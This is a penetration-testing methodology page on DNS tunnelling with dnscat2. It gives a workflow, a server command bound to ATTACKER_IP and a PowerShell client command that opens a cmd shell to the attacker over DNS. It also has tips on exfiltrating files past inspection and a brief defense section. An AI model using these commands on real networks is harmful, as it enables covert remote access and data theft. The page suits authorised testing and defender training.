---
layout: page
title: "DNS Tunnelling with dnscat2"
subtitle: "An encrypted command channel carried in DNS queries and TXT responses"
permalink: /methodology/pivoting/dns-tunnelling-dnscat2/
---

dnscat2 tunnels a command and control channel through DNS. The client on the target sends queries to a name server that the attack host controls, and the server answers with data in TXT records. The channel is encrypted with a pre-shared secret. It suits environments where DNS is the only outbound path, or where data needs to leave through a resolver that inspection does not decode.

## Workflow

1. Confirm the target can resolve names through a resolver that forwards to the attack host's domain.
2. Start the dnscat2 server on the attack host, pointing it at the domain and a pre-shared secret.
3. Import the PowerShell client on the Windows target, or run the client on a Linux host.
4. Start the client with the same DNS server, domain and pre-shared secret.
5. Open an interactive command session through the channel.

Server on the attack host:

```bash
attacker$ sudo ruby dnscat2.rb --dns host=ATTACKER_IP,port=53,domain=DOMAIN --no-cache
```

The server prints the secret that the client must use. Record it and keep it out of shared notes.

PowerShell client on the Windows target:

```powershell
PS C:\> Import-Module .\dnscat2.ps1
PS C:\> Start-Dnscat2 -DNSserver ATTACKER_IP -Domain DOMAIN -PreSharedSecret SECRET -Exec cmd
```

## What to look for

- The server reports a new session once the client connects. If no session appears, check that the query reaches the attack host on port 53.
- The `-PreSharedSecret` value must match the server's secret exactly. A mismatch fails the encryption handshake.
- Data moves slowly. Use it for small command output and file exfiltration, not for bulk transfers.

## Pitfalls

- The client must be told the secret with `-PreSharedSecret`. Leaving it out fails authentication.
- Recursive resolvers cache responses. The server runs with `--no-cache` so answers are not stored along the path.
- DNS traffic often passes inspection that blocks other protocols, but resolvers and monitoring systems can still flag high volumes of long or unusual queries.

## Defense and prevention

Restrict outbound DNS to approved resolvers, block direct queries to external name servers, and log query length, frequency and TXT record volume. Treat sustained high-volume DNS from a single host as a likely tunnel.
